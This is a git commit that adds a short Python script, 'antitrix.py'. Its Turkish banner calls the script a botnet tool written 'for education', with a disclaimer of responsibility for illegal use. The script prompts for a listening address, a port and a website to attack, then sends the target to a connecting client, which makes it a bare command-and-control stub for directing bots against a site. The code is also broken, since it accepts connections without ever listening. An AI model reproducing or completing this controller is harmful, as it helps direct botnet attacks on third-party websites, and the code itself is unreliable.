84568c978ccc66e2def476b3048b873c8a39bb45
M4Nyak <119705619+M4Nyak@users.noreply.github.com>
2023-03-28 11:44:50 +0300

    Create antitrix.py

---
+++ antitrix.py
@@ -0,0 +1,25 @@
+import requests
+import socket
+import time
+print('bu yazilim ovsky ailesinden Ömovsky tarafindan kodlanmiş bir botnet aracidir')
+print('bu yazilim eğitim için kodlanmistir herhangi bir illegal kullanimdan ben sorumlu değilimdir')
+print("""\
+
+   ___   _   _  _____  _____  _____ ______  _____ __   __
+ / _ \ | \ | ||_   _||_   _||_   _|| ___ \|_   _|\ \ / /
+/ /_\ \|  \| |  | |    | |    | |  | |_/ /  | |   \ V / 
+|  _  || . ` |  | |    | |    | |  |    /   | |   /   \ 
+| | | || |\  |  | |   _| |_   | |  | |\ \  _| |_ / /^\ 
+\_| |_/\_| \_/  \_/   \___/   \_/  \_| \_| \___/ \/   \/
+
+
+                    """)
+print('Antitrix başlatiliyor...')
+time.sleep(10)
+ipadresi= str(input('dinleme yapilacak ip:' ))
+port= int(input('dinlenicek port'))
+saldirilacaksite= input('saldirilacak web sitesi')
+soket= socket.socket()
+soket.bind((ipadresi,port))
+conn, addr= soket.accept()
+conn.sendall(saldirilacaksite.encode())
